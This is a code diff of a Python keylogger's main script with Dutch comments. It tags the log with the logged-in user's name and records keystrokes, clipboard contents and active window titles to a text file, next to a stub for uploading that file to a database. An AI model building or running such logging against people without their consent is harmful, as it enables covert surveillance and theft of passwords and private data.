@@ -10,17 +10,21 @@ import web_and_app_info_logger
 import keystrokes_and_clipboard_logger
 import os
 import datetime
-import keyboard as kb
+import getpass
 
 event_string = ''
+
+
 # Main code here
 def main():
     if os.path.isfile("keyboard_events.txt"):
         # Code voor versturen van het bestand naar DB
         print("Bestand is verstuurd naar de database!")
 
+    user = getpass.getuser()
+
     with open("keyboard_events.txt", 'w') as f:
-        f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
+        f.write(f"Gebruiker: {user}" + "\n")
         f.write("======================================================" + "\n")
         keylogger = keystrokes_and_clipboard_logger.Keylogger()
         last_window_title = None
@@ -43,7 +47,9 @@ def main():
                 f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
             last_window_title = active_window_title
 
-            old_clipboard,new_clipboard = keystrokes_and_clipboard_logger.copy_clipboard(f, old_clipboard, new_clipboard)
+            old_clipboard, new_clipboard = keystrokes_and_clipboard_logger.copy_clipboard(f, old_clipboard,
+                                                                                          new_clipboard)
+
 
 if __name__ == '__main__':
     main()
